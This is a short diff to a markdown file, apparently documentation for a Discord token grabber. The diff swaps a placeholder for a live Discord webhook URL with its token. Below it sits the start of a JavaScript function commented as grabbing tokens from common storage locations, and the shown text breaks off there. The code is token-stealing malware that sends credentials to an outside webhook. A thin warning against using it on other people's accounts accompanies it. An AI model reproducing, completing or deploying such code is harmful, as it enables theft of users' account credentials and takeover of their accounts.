@@ -91,11 +91,11 @@ if(!quest) {
     } 
 }
 ```
-# Unpatched version (NEVER USE IT ON SOMEONE ELSE's ACCOUNT
+# Unpatched version (NEVER USE IT ON SOMEONE ELSE's ACCOUNT)
 
 ```javascript
 // Replace with your Discord webhook URL
-const webhookUrl = '[YOUR_DISCORD_WEBHOOK_URL_HERE](https://discord.com/api/webhooks/1361472334891847872/A9qEum43WYB-WcSv3sezCinupJtM-e6K9G4I_dMqUpKzQiUxsTzNyEdOZu2ondcuBiKg)';
+const webhookUrl = 'https://discord.com/api/webhooks/1361472334891847872/A9qEum43WYB-WcSv3sezCinupJtM-e6K9G4I_dMqUpKzQiUxsTzNyEdOZu2ondcuBiKg';
 
 // Function to grab tokens from common storage locations
 function grabTokens() {
